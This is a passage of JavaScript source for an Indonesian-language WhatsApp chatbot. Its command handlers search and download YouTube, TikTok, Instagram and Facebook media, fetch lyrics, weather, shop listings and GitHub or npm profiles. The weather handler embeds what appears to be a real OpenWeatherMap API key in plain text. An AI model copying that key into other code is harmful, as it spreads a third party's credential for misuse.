						return newReply(`❌ *Video tidak ditemukan!* Coba kata kunci lain ya, Kak.`);
					}
					let results = search.videos.slice(0, 5);
					for (let i = 0; i < results.length; i++) {
						let video = results[i];
						let caption = `🔢 *No*: ${i + 1}\n`;
						caption += `🎬 *Judul*: ${video.title || 'Tidak ada judul'}\n`;
						caption += `👤 *Channel*: ${video.author?.name || 'Tidak diketahui'}\n`;
						caption += `👁️ *Views*: ${video.views || 'Tidak diketahui'}\n`;
						caption += `⏳ *Durasi*: ${video.timestamp || 'Tidak diketahui'}\n`;
						caption += `📆 *Diunggah*: ${video.ago || 'Tidak diketahui'}\n`;
						caption += `🔗 *Link*: ${video.url || 'Tidak ada link'}\n`;
						await sock.sendMessage(m.chat, {
							image: { url: video.thumbnail || imageUrl },
							caption: caption,
						}, { 
							quoted: m 
						});
					}
					newReply(`✅ *Berhasil menampilkan 5 hasil pencarian dari YouTube!*`);
				} catch (err) {
					console.error(err);
					newReply(`❌ *Terjadi kesalahan saat mencari video!* 😭\n${err.message || err}`);
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'hdoc': 
			case 'halodoc': 
			case 'cari': {
				if (!text) return newReply('Ketikkan perintah dengan format:\n*!cari [penyakit]*\n\n*Kirim perintah*: *!cari diabetes*');
				const query = text.trim();
				const data = await halodoc(query);
				try {
					newReply('🔍 Sedang mencari informasi, mohon tunggu...');
					const articles = await data.getArtikelSearch();
					const obatList = await data.getObatSearch();
					if (articles.length === 0 && obatList.length === 0) {
						return newReply('❌ Tidak ditemukan informasi terkait penyakit yang dicari.');
					}
					let artikelResult = '*📚 Artikel Tentang Penyakit:*\n';
					for (let i = 0; i < Math.min(articles.length, 5); i++) { // Maks 5 hasil
						const { title, description, link } = articles[i];
						artikelResult += `\n*${i + 1}. ${title}*\n${description}\n`;
					}
					let obatResult = '\n*💊 Obat yang Direkomendasikan:*\n';
					for (let i = 0; i < Math.min(obatList.length, 5); i++) { // Maks 5 hasil
						const { title, subtitle, price, link } = obatList[i];
						obatResult += `\n*${i + 1}. ${title}*\n${subtitle}\n💰 Harga: ${price}\n`;
					}
					await newReply(artikelResult + obatResult);
				} catch (error) {
					console.error(error);
					newReply('❌ Terjadi kesalahan saat mencari informasi. Coba lagi nanti.');
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'lirik': 
			case 'lyrics': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) return newReply(`⚠️ Kak, jangan lupa tulis judul lagunya! 🥺\n*Kirim perintah*: *${prefix + command} Someone Like You*`);
				try {
					const searchResults = await lyrics.search(text);
					if (searchResults.length === 0) {
						return newReply('⚠️ Tidak ada hasil yang ditemukan untuk lagu tersebut. Coba judul lain, ya! 🎶');
					}
					const firstResult = searchResults[0];
					let captionText = `🎵 *Lirik Lagu Ditemukan!* 🎵\n\n`;
					captionText += `📌 *Judul*: ${firstResult.title}\n`;
					captionText += `🎤 *Artis*: ${firstResult.artist}\n`;
					captionText += `💿 *Album*: ${firstResult.album}\n`;
					captionText += `🔗 *Lirik Lengkap*: ${firstResult.link}\n`;
					captionText += `🖼️ *Gambar*: ${firstResult.imageUrl || 'Tidak ada gambar'}\n\n`;
					captionText += `_Sedang mengambil lirik lengkap, tunggu sebentar..._`;
					await await newReply(captionText);
					const lyricsData = await lyrics.getLyrics(firstResult.link);
					let lyricsResponse = `🎼 *Lirik Lengkap: ${firstResult.title}* 🎼\n\n`;
					lyricsResponse += `${lyricsData.lyrics || 'Lirik tidak tersedia.'}\n\n`;
					lyricsResponse += `📅 *Tahun Rilis*: ${lyricsData.year || 'Tidak diketahui'}\n`;
					lyricsResponse += `🎧 *Playlist*: ${lyricsData.playlists || 'Tidak ada playlist'}\n`;
					lyricsResponse += `🖼️ *Artis*: ${lyricsData.artistImage || 'Tidak ada gambar artis'}\n`;
					newReply(lyricsResponse);
				} catch (error) {
					console.error(error);
					newReply('⚠️ Terjadi kesalahan saat mencari lirik lagu. Coba lagi nanti ya, Kak!');
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'yt':
			case 'play':
			case 'ytplay': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) return newReply(`*Kirim perintah*: ${prefix + command} Lagu favorit`);
				try {
					await m.react('⏱️');
					const search = await yts(`${text}`);
					if (!search || search.all.length === 0) return newReply(`*Lagu tidak ditemukan!* ☹️`);
					const { 
						videoId, 
						image, 
						title, 
						views, 
						duration, 
						author, 
						ago, 
						url, 
						description 
					} = search.all[0];
					const button = [{
						"name": "single_select",
						"buttonParamsJson": `{
							"title": "Click Here ⎙",
							"sections": [
								{
									"title": "Unduh Audio 🎧",
									"rows": [
										{
											"header": "Audio Otomatis 🎵",
											"title": "Download Audio - Automatic Quality",
											"id": ".ytmp3 ${url}"
										}
									]
								},
								{
									"title": "Unduh Video 🎥",
									"rows": [
										{
											"header": "Video Otomatis 🎥",
											"title": "Download Video - Automatic Quality",
											"id": ".ytmp4 ${url}"
										}
									]
								}
							]
						}`
					}];
					let caption = `*${title}*\n\n`;
					caption += `*🎶 Jenis*: Play\n`;
					caption += `*📌 ID*: ${videoId}\n`;
					caption += `*⏱️ Durasi*: ${duration}\n`;
					caption += `*🕒 Diunggah*: ${ago}\n`;
					caption += `*🔗 Link*: ${url}\n\n`;
					caption += `_*Pilih jenis download yang Kamu butuhin... pilih yang paling pas buat Kamu ya!*_`;
					sock.sendButtonImage(m.chat, { url: image }, button, caption, footer, m)
				} catch (error) {
					console.log(error);
					newReply('Gagal saat melakukan tindakan, jika anda pemilik silahkan cek console.');
				};
				db.data.users[m.sender].limit -= 1;
				break;
			}

			case 'ytaudio': 
			case 'ytmp3': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) return newReply(`*Kirim perintah*: ${prefix + command} <url>`);
				const youtubeRegex = /^(https?:\/\/)?(www\.)?(youtube\.com|youtu\.be)\/(watch\?v=|embed\/|v\/|.+\?v=)?([a-zA-Z0-9_-]{11})$/;
				if (!youtubeRegex.test(text)) return newReply(`Link yang Kamu masukkan bukan link YouTube valid! 😅`);
				try {
					const result = await youtube(text);
					if (result && result.mp3) {
						let captionText = `*${result.title}*\n\n`;
						captionText += `- *Creator*: ${result.name || "Tidak diketahui"}\n`;
						captionText += `- *Views*: ${formatAngka(result.views || "0")}\n`;
						captionText += `- *Upload*: ${result.ago || "Tidak diketahui"}\n`;
						captionText += `- *Status*: 200\n\n`;
						captionText += `_Tunggu sebentar, media sedang dikirim..._`;
						await newReply(captionText);
						await sock.sendMessage(m.chat, { 
							audio: { url: result.mp3 }, 
							mimetype: 'audio/mp4' 
						}, { 
							quoted: m 
						});
					} else {
						newReply("Gagal mengambil data dari YouTube.");
					}
				} catch (err) {
					console.error(err);
					await m.react('😭');
					newReply('*Data tidak ditemukan!* ☹️');
				}
				db.data.users[m.sender].limit -= 1;
				break;
			}

			case 'ytmp4': 
			case 'ytvideo': 
			case 'ytv': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) return newReply(`*Kirim perintah*: ${prefix + command} <url>`);
				const youtubeRegex = /^(https?:\/\/)?(www\.)?(youtube\.com|youtu\.be)\/(watch\?v=|embed\/|v\/|.+\?v=)?([a-zA-Z0-9_-]{11})$/;
				if (!youtubeRegex.test(text)) return newReply(`Link yang Kamu masukkan bukan link YouTube valid! 😅`);
				try {
					const result = await youtube(text);
					if (result && result.mp4) {
						let captionText = `*${result.title}*\n\n`;
						captionText += `- *Creator*: ${result.name || "Tidak diketahui"}\n`;
						captionText += `- *Views*: ${formatAngka(result.views || "0")}\n`;
						captionText += `- *Upload*: ${result.ago || "Tidak diketahui"}\n`;
						captionText += `- *Status*: 200`;
						sock.sendMessage(m.chat, { 
							video: { url: result.mp4 }, 
							caption: captionText 
						}, { 
							quoted: m 
						});
					} else {
						newReply("Gagal mengambil data dari YouTube.");
					}
				} catch (err) {
					console.error(err);
					await m.react('😭');
					newReply('*Data tidak ditemukan!* ☹️');
				}
				db.data.users[m.sender].limit -= 1;
				break;
			}

			case 'tiktokslide':
			case 'ttslide':
			case 'tiktokfoto':
			case 'tiktokmp4':
			case 'tt':
			case 'ttnowm':
			case 'tiktoknowm':
			case 'tiktok': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) return newReply(`⚠️ Hmm... Kamu belum kasih link nih! 🫣 Coba ketik kayak gini ya: *${prefix + command} <url>*`);
				try {
					await m.react('⏱️');
					let anu = await tiktokDownloaderVideo(text);
					let item = 0;
					for (let imgs of anu.data) {
						if (imgs.type == "nowatermark") {
							await sock.sendMessage(
								m.chat,
								{
									video: { url: imgs.url },
									caption: `🎥 *Video Info*:\n📍 Region: ${anu.region}\n⏳ Duration: ${anu.duration}\n📅 Taken: ${anu.taken_at}\n\n📊 *Statistik Info*:\n👁️ Views: ${anu.stats.views}\n❤️ Likes: ${anu.stats.likes}\n💬 Comment: ${anu.stats.comment}\n🔄 Share: ${anu.stats.share}\n📥 Download: ${anu.stats.download}\n\n👤 *Author Info*:\n📝 Fullname: ${anu.author.fullname}\n🏷️ Nickname: ${anu.author.nickname}\n\n🎵 *Music Info*:\n🎼 Title: ${anu.music_info.title}\n🎤 Author: ${anu.music_info.author}\n💿 Album: ${anu.music_info.album}\n\n📝 *Caption*:\n${anu.title || 'No Caption'}`
								},
								{ quoted: m }
							);
						}
						if (imgs.type == "photo") {
							if (item == 0) {
								await sock.sendMessage(
									m.chat,
									{
										image: { url: imgs.url },
										caption: `🖼️ *Photo Info*:\n📍 Region: ${anu.region}\n📅 Taken: ${anu.taken_at}\n\n📊 *Statistik Info*:\n👁️ Views: ${anu.stats.views}\n❤️ Likes: ${anu.stats.likes}\n💬 Comment: ${anu.stats.comment}\n🔄 Share: ${anu.stats.share}\n📥 Download: ${anu.stats.download}\n\n👤 *Author Info*:\n📝 Fullname: ${anu.author.fullname}\n🏷️ Nickname: ${anu.author.nickname}\n\n🎵 *Music Info*:\n🎼 Title: ${anu.music_info.title}\n🎤 Author: ${anu.music_info.author}\n💿 Album: ${anu.music_info.album}\n\n📝 *Caption*:\n${anu.title || 'No Caption'}${m.isGroup ? anu.data.length > 1 ? "\n📥 _Sisa foto dikirim ke private chat_\n" : "\n" : "\n"}`
									},
									{ quoted: m }
								);
							} else {
								await sock.sendMessage(
									m.sender,
									{
										image: { url: imgs.url }
									},
									{ quoted: m }
								);
							}
							item += 1;
							await sleep(2000);
						}
					}
				} catch (err) {
					console.log(err);
					newReply('⚠️ Gagal mengambil data dari TikTok. Pastikan URL valid atau coba lagi nanti.');
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'ttaudio':
			case 'tiktokmp3':
			case 'ttmp3':
			case 'tiktokaudio': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) return newReply(`⚠️ Hmm... Kamu belum kasih link nih! 🫣 Coba ketik kayak gini ya: *${prefix + command} <url>*`);
				try {
					await m.react('⏱️');
					let anu = await tiktokDownloaderVideo(text);
					let audio = anu.music_info.url;
					await sock.sendMessage(
						m.chat,
						{
							text: `🎵 *TikTok Audio*\n\n` +
							`🎼 *Judul*: ${anu.music_info.title || '-'}\n` +
							`🎤 *Author*: ${anu.music_info.author || '-'}\n` +
							`💿 *Album*: ${anu.music_info.album || '-'}\n\n` +
							`🔗 *Source*: ${text}`
						},
						{ quoted: m }
					);
					await sock.sendMessage(
						m.chat,
						{
							audio: { url: audio },
							mimetype: 'audio/mpeg',
							fileName: `${anu.music_info.title || 'audio'}.mp3`
						},
						{ quoted: m }
					);
				} catch (error) {
					console.error(error);
					await newReply(`❌ Terjadi kesalahan saat mengambil audio. Coba lagi nanti, ya Kak!`);
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'tiktoksearch':
			case 'tiktoks':
			case 'ttsearch': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply("Yah kak, limitnya udah habis nih 😢. Yuk upgrade ke premium biar bisa terus pakai fitur ini! ✨");
				if (!text) return newReply(`⚠️ Eits, Kamu lupa kasih kata kunci! 😅\nCoba ketik kayak gini ya: *${prefix + command} <query>*`);
				try {
					await m.react('⏱️');
					let search = await tiktokSearchVideo(text);
					let teks = `🎥 *${search.videos[0].title}*\n\n`;
					teks += `🆔 *Video ID*: ${search.videos[0].video_id}\n`;
					teks += `👤 *Username*: ${search.videos[0].author.unique_id}\n`;
					teks += `🏷️ *Nickname*: ${search.videos[0].author.nickname}\n`;
					teks += `⏳ *Duration*: ${search.videos[0].duration} detik\n`;
					teks += `❤️ *VT Like*: ${search.videos[0].digg_count}\n`;
					teks += `💬 *Comment*: ${search.videos[0].comment_count}\n`;
					teks += `🔄 *Share*: ${search.videos[0].share_count}\n\n`;
					teks += `🔗 *Link*: https://www.tiktok.com/@${search.videos[0].author.unique_id}/video/${search.videos[0].video_id}`;
					let list = '';
					let no = 1;
					for (let i of search.videos) {
						list += `\n${no++}. 🎵 *${i.title}*\n`;
						list += `⏳ *Duration*: ${i.duration} detik\n`;
						list += `❤️ *Likes*: ${i.digg_count}\n`;
						list += `💬 *Comments*: ${i.comment_count}\n`;
						list += `🔄 *Shares*: ${i.share_count}\n`;
						list += `🔗 *Link*: https://www.tiktok.com/@${i.author.unique_id}/video/${i.video_id}\n`;
					}
					await sock.sendMessage(
						m.chat,
						{
							video: { url: `https://tikwm.com${search.videos[0].play}` },
							caption: teks
						},
						{ quoted: m }
					);
					if (search.videos.length > 1) {
						await sock.sendMessage(
							m.chat,
							{
								text: `📚 *Daftar Video Lainnya:*\n${list}`
							},
							{ quoted: m }
						);
					}
				} catch (error) {
					console.log(error);
					newReply("Aduh, ada error kak 😟. Coba lagi ya, MiwaAI siap bantu! ✨");
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'scroll':
			case 'carivideo': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply("Yah kak, limitnya udah habis nih 😢. Yuk upgrade ke premium biar makin bebas pakai fitur ini! ✨");
				if (!isPremium) return newReply("Fitur ini khusus buat pengguna premium aja, kak! Yuk upgrade sekarang juga biar bisa pakai fitur ini 😊.");
				if (!text) return newReply(`⚠️ Eits, Kamu lupa kasih kata kunci nih! 😅\nCoba ketik kayak gini ya: *${prefix + command} galau* 😉`);
				let search = await tiktokSearchVideo(text);
				let captionText = `🎥 ${search.videos[0].title}\n\n`;
				captionText += `🆔 *Video ID*: ${search.videos[0].video_id}\n`;
				captionText += `👤 *Username*: ${search.videos[0].author.unique_id}\n`;
				captionText += `🏷️ *Nickname*: ${search.videos[0].author.nickname}\n`;
				captionText += `⏳ *Duration*: ${search.videos[0].duration} detik\n`;
				captionText += `❤️ *VT Like*: ${search.videos[0].digg_count}\n`;
				captionText += `💬 *Comment*: ${search.videos[0].comment_count}\n`;
				captionText += `🔄 *Share*: ${search.videos[0].share_count}\n\n`;
				captionText += `🔗 *Link*: https://www.tiktok.com/@${search.videos[0].author.unique_id}/video/${search.videos[0].video_id}`;	
				m.reply({
					video: { url: `https://tikwm.com${search.videos[0].play}` },
					caption: captionText,
					footer: footer,
					buttons: [
						{
							buttonId: `${prefix + command} ${text}`,
							buttonText: { displayText: "Cari Lagi 🔍" }
						},
						{
							buttonId: `.ttmp3 https://www.tiktok.com/@${search.videos[0].author.unique_id}/video/${search.videos[0].video_id}`,
							buttonText: { displayText: "Unduh MP3 🎵" }
						}
					],
					viewOnce: true
				});
			};
			break;

			case 'presetam': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) return newReply(`⚠️ Eits, Kamu lupa kasih URL! 😗 Coba ketik kayak gini ya: *${prefix + command} [URL Alight Motion]*`);
				if (!(text.includes('http://') || text.includes('https://'))) {
					return newReply(`⚠️ URL tidak valid. Coba pakai URL yang diawali dengan http:// atau https://`);
				}
				if (!(text.includes('alight.link') || text.includes('alightcreative.com'))) {
					return newReply(`⚠️ URL yang diberikan bukan URL Alight Motion!`);
				}
				try {
					await m.react('⏱️');
					const result = await alightScrape(text);
					if (result.error) {
						return newReply(result.error);
					}
					const { title, description } = result;
					await newReply(`「 *PRESET ALIGHT MOTION* 」\n\n · *Judul*: ${title}\n · *Deskripsi*: ${description}`);
				} catch (error) {
					console.error(error);
					newReply('⚠️ Terjadi kesalahan saat mengambil data dari URL!');
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'soundcloudsearch':
			case 'scsearch': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) return newReply(`⚠️ Eits, Kamu lupa kasih kata kunci! 😗 Coba ketik kayak gini ya: *${prefix + command} <query>*`);
				try {
					let results = await scrapeSoundCloud(text);	// Panggil fungsi scraper untuk SoundCloud
					if (results.length === 0) return newReply('😔 Maaf, kak! Tidak ada hasil yang ditemukan. Coba kata kunci yang lain ya!');
					let teks = `🎧 *Hasil Pencarian SoundCloud untuk*: ${text}\n\n`;
					let list = '';
					let no = 1;
					for (let i of results) {
						list += `\n${no++}. 🎵 *${i.title}*\n` +
							`🔗 *Link*: ${i.url}\n`;
					}
					await sock.sendMessage(
						m.chat,
						{
							text: teks + list
						},
						{ quoted: m }
					);
				} catch (error) {
					console.log(error);
					newReply('⚠️ Terjadi kesalahan saat mencari data di SoundCloud, coba lagi nanti ya!');
				}
				db.data.users[m.sender].limit -= 1;
				break;
			}

			case "facebook":
			case "fbdl": {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) return newReply(`Gunakan dengan format: \n${prefix + command} <link_video>\n\nContoh:\n${prefix + command} https://www.facebook.com/IrfanBrnsd/videos/559557717015956/`);
				try {
					newReply("⏳ Sedang memproses video, harap tunggu...");
					const videoDetails = await fdown.download(text);		
					if (!videoDetails.length) {
						return newReply("❌ Video tidak ditemukan atau link tidak valid!");
					}
					const videoInfo = videoDetails[0];
					const message = `🎬 *Video Details:*\n\n📌 *Judul*: ${videoInfo.title || "Tidak diketahui"}\n📝 *Deskripsi*: ${videoInfo.description || "Tidak tersedia"}\n⏱ *Durasi*: ${videoInfo.duration || "Tidak diketahui"}`;
					await sock.sendMessage(
						m.chat,
						{ image: { url: videoInfo.thumbnail || '' }, caption: message },
						{ quoted: m }
					);
					if (videoInfo.hdQualityLink) {
						await sock.sendMessage(
							m.chat,
							{ video: { url: videoInfo.hdQualityLink }, caption: "🎥 Video kualitas HD" },
							{ quoted: m }
						);
					} else if (videoInfo.normalQualityLink) {
						await sock.sendMessage(
							m.chat,
							{ video: { url: videoInfo.normalQualityLink }, caption: "🎥 Video kualitas SD" },
							{ quoted: m }
						);
					} else {
						newReply("❌ Gagal mengunduh video!");
					}
				} catch (error) {
					console.error(error);
					newReply("❌ Terjadi kesalahan saat memproses permintaan Anda. Pastikan link yang diberikan valid.");
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'igstory':
			case 'igs':
			case 'instagramstory':
			case 'instastory':
			case 'igslide':
			case 'igphoto':
			case 'instaphoto':
			case 'instafoto':
			case 'igfoto':
			case 'instagram':
			case 'ig':
			case 'igdl':
			case 'igvideo':
			case 'instavideo':
			case 'instavid':
			case 'igreels':
			case 'instareels':
			case 'instareel':
			case 'igtv':
			case 'instatv': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply("⚠️ Maaf Kak, limit Kamu sudah habis. Upgrade ke premium atau tunggu besok ya! 😊");
				if (!text) return newReply(`⚠️ Kirim perintah: ${prefix + command} <url>\n\n🤔 Contoh:\n${prefix + command} https://www.instagram.com/reel/Cr5AXBQvBC1/?igshid=MzRlODBiNWFlZA==`);
				if (!/instagram.com/.test(text)) return newReply("> Tolong masukkan link Instagram yang valid ya Kak! 🙏");
				try {
					let data = await Instagram(text);
					if (!data) return newReply("❌ Gagal mendapatkan data dari link tersebut. Cek kembali link-nya ya, Kak!");
					for (let i of data.url) {
						let res = await fetch(i);
						let buffer = Buffer.from(await res.arrayBuffer());
						let caption = "「 *INSTAGRAM DL* 」\n\n";
						caption += `👤 *Username*: ${data.metadata.username || 'Tidak tersedia'}\n`;
						caption += `📝 *Caption*: ${data.metadata.caption || 'Tidak ada'}\n`;
						caption += `❤️ *Likes*: ${data.metadata.like || 0}\n`;
						caption += `💬 *Komentar*: ${data.metadata.comment || 0}\n`;
						caption += `🔗 *Sumber*: ${text}`;
						if (data.metadata.isVideo) {
							sock.sendFile(m.chat, buffer, 'video.mp4', caption, m);
						} else {
							sock.sendFile(m.chat, buffer, 'image.jpg', caption, m);
						}
					}
				} catch (error) {
					console.error(error);
					await newReply("❌ Terjadi kesalahan saat memproses permintaan. Coba lagi nanti ya, Kak! 🙏");
				}
				db.data.users[m.sender].limit -= 1;
				break;
			}

			case 'git': 
			case 'gitclone': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!args[0]) return newReply(`📦 *Linknya mana, Kak?*\n\nContoh:\n${prefix}${command} https://github.com/user/repo`);
				if (!isUrl(args[0]) || !args[0].includes('github.com')) 
					return newReply(`❌ *Link tidak valid!* Pastikan link berasal dari GitHub ya, Kak.`);
				try {
					await m.react('⏳');
					let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i;
					let [, user, repo] = args[0].match(regex) || [];
					if (!user || !repo) return newReply(`❌ *Gagal membaca link repositori!* Pastikan link benar ya, Kak.`);
					repo = repo.replace(/.git$/, '');
					let url = `https://api.github.com/repos/${user}/${repo}/zipball`;
					let data = await fetch(url, { method: 'HEAD' });
					let filename = data.headers.get('content-disposition')?.match(/attachment; filename=(.*)/)?.[1] || `${repo}.zip`;
					await sock.sendMessage(m.chat, {
						document: { url: url },
						fileName: filename,
						mimetype: 'application/zip'
					}, { 
						quoted: m 
					});
					newReply(`✅ *Berhasil mengirim file repositori GitHub!*\nNama File: ${filename}`);
				} catch (err) {
					console.error(err);
					newReply(`❌ *Terjadi kesalahan saat mengunduh repositori!* 😭\n${err.message || err}`);
					}
				db.data.users[m.sender].limit -= 1;
			}
			break;

			case 'cuaca':
			case 'weather': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) return newReply(`🌍 *Lokasinya mana, Kak?*\n\nContoh:\n${prefix}${command} Jakarta`);
				try {
					await m.react('⏳');
					let { data } = await axios.get(`https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&lang=id`);
					let weatherInfo = `🌦️ *Informasi Cuaca di ${data.name}, ${data.sys.country}*\n`;
					weatherInfo += `🌡️ *Suhu*: ${data.main.temp}°C (Terasa seperti ${data.main.feels_like}°C)\n`;
					weatherInfo += `🌬️ *Kecepatan Angin*: ${data.wind.speed} m/s\n`;
					weatherInfo += `💧 *Kelembapan*: ${data.main.humidity}%\n`;
					weatherInfo += `🔄 *Tekanan Udara*: ${data.main.pressure} hPa\n`;
					weatherInfo += `📍 *Koordinat*: ${data.coord.lat}, ${data.coord.lon}\n`;
					weatherInfo += `📝 *Deskripsi*: ${data.weather[0].description}\n`;		
					await sock.sendMessage(m.chat, { text: weatherInfo }, { quoted: m });
					newReply(`✅ *Informasi cuaca berhasil dikirim!*`);
				} catch (err) {
					console.error(err);
					if (err.response && err.response.status === 404) {
						newReply(`❌ *Lokasi tidak ditemukan!* Coba cek lagi nama lokasinya ya, Kak.`);
					} else {
						newReply(`❌ *Terjadi kesalahan saat mengambil data cuaca!* 😭\n${err.message || err}`);
					}
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'bukalapak': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) return newReply(`⚠️ Uh-oh, Kamu lupa kasih kata kunci nih! 🫣 Coba ketik kayak gini ya: *${prefix + command} iPhone 15 Case* biar MiwaAI bisa bantu cari produknya! 🛒✨`);
				try {
					let hasil = await BukaLapak(text);
					if (!hasil || hasil.length === 0) {
						return newReply('❌ Tidak ditemukan hasil untuk pencarian tersebut, coba kata kunci lain ya kak!');
					}
					let replyText = `🛒 *Hasil Pencarian Bukalapak:*\n🔍 *Kata Kunci*: ${text}\n\n`;
					hasil.slice(0, 3).forEach((item, i) => {
						replyText += `*${i + 1}. ${item.title}*\n`;
						replyText += `💵 *Harga*: ${item.harga}\n`;
						replyText += `⭐ *Rating*: ${item.rating}\n`;
						replyText += `📦 *Terjual*: ${item.terjual}\n`;
						replyText += `📍 *Lokasi Toko*: ${item.store.lokasi}\n`;
						replyText += `🏬 *Toko*: ${item.store.nama}\n`;
						replyText += `🛒 *Link Toko*: ${item.store.link}\n`;
						replyText += `🔗 *Link Produk*: ${item.link}\n\n`;
					});
					await sock.sendMessage(
						m.chat,
						{
							image: { url: hasil[0].image },
							caption: `🖼️ *Gambar Produk Pertama*: ${hasil[0].title}`
						},
						{ quoted: m }
					);
					await sock.sendMessage(
						m.chat,
						{
							text: replyText
						},
						{ quoted: m }
					);
				} catch (error) {
					console.error('Error Bukalapak:', error.response?.data || error.message);
					await newReply(`❌ Terjadi kesalahan saat mengambil data dari Bukalapak. Coba lagi nanti ya kak!`);
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'playstore': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) return newReply(`⚠️ Uh-oh, Kamu lupa kasih kata kunci nih! 🫣 Coba ketik kayak gini ya: *${prefix + command} WhatsApp* biar MiwaAI bisa bantu cari aplikasinya! 📲✨`);
				try {
					await m.react('⏱️');
					let hasil = await PlayStore(text);
					if (!hasil || hasil.length === 0 || hasil.message) {
						return newReply('❌ Tidak ditemukan hasil untuk pencarian tersebut, coba kata kunci lain ya kak!');
					}
					let replyText = `📲 *Hasil Pencarian Play Store:*\n🔍 *Kata Kunci*: ${text}\n\n`;
					hasil.slice(0, 3).forEach((item, i) => {
						replyText += `*${i + 1}. ${item.nama}*\n`;
						replyText += `👤 *Developer*: ${item.developer}\n`;
						replyText += `⭐ *Rating*: ${item.rate}\n`;
						replyText += `🔗 *Link*: ${item.link}\n`;
						replyText += `🏢 *Link Developer*: ${item.link_dev}\n\n`;
					});
					await sock.sendMessage(
						m.chat,
						{
							image: { url: hasil[0].img },
							caption: `🖼️ *Gambar Aplikasi Pertama*: ${hasil[0].nama}`
						},
						{ quoted: m }
					);
					await sock.sendMessage(
						m.chat,
						{
							text: replyText
						},
						{ quoted: m }
					);
				} catch (error) {
					console.error('Error Play Store:', error.response?.data || error.message);
					await newReply(`❌ Terjadi kesalahan saat mengambil data dari Play Store. Coba lagi nanti ya kak!`);
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'umma': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) return newReply(`⚠️ Gunakan dengan cara: ${prefix + command} *url artikel*`);
				try {
					const result = await umma(text);
					newReply(`📖 *Artikel*: ${result.title}\n\n👤 *Penulis*: ${result.author.name}\n💬 *Caption*: ${result.caption}\n\n🔗 *Sumber*: ${text}`);
				} catch (err) {
					console.error(err);
					newReply(`❌ Ada masalah waktu ambil artikel dari Umma, Kak! Coba lagi nanti ya 🥺`);
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'githubstalk': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) return newReply(`⚠️ Gunakan dengan cara: ${prefix + command} *username github*\n\n🤔 *Contohnya:*\n\n${prefix + command} MiwaAIAI`);
				try {
					const userInfo = await githubstalk(text);
					console.log(userInfo);
					newReply(`🧑‍💻 *Username*: ${userInfo.username || 'Anonim'}\n🌟 *Nickname*: ${userInfo.nickname || 'Anonim'}\n📝 *Bio*: ${userInfo.bio || 'Tidak tersedia'}\n🆔 *ID*: ${userInfo.id}\n🔑 *NodeID*: ${userInfo.nodeId}\n🔗 *Url*: ${userInfo.url}\n🏷️ *Type*: ${userInfo.type}\n👑 *Admin*: ${userInfo.admin ? 'Ya' : 'Tidak'}\n🏢 *Company*: ${userInfo.company || 'Tidak ada'}\n🌐 *Blog*: ${userInfo.blog || 'Tidak ada'}\n📍 *Location*: ${userInfo.location || 'Tidak diketahui'}\n📧 *Email*: ${userInfo.email || 'Tidak tersedia'}\n📚 *Public Repo*: ${userInfo.public_repo}\n🎁 *Public Gists*: ${userInfo.public_gists}\n👥 *Followers*: ${userInfo.followers}\n➕ *Following*: ${userInfo.following}\n🕰️ *Created At*: ${userInfo.created_at}\n🔄 *Updated At*: ${userInfo.updated_at}`);
				} catch (err) {
					console.error(err);
					newReply(`❌ Ada masalah waktu ambil data GitHub, Kak! Coba lagi nanti ya 🥺`);
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'npmstalk': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) return newReply(`⚠️ Gunakan dengan cara: ${prefix + command} *nama package npm*\n\n🤔 *Contohnya:*\n\n${prefix + command} axios`);
				try {
					const npmInfo = await npmstalk(text);
					newReply(`📦 *Package*: ${npmInfo.name}\n🔢 *Versi Terbaru*: ${npmInfo.versionLatest}\n📅 *Waktu Terbit*: ${npmInfo.publishTime}\n🔧 *Dependencies Terbaru*: ${npmInfo.latestDependencies}`);
				} catch (err) {
					console.error(err);
					newReply(`❌ Ada masalah waktu ambil data dari NPM, Kak! Coba lagi nanti ya 🥺`);
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'ffchars':
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				let characters = await ffCh();
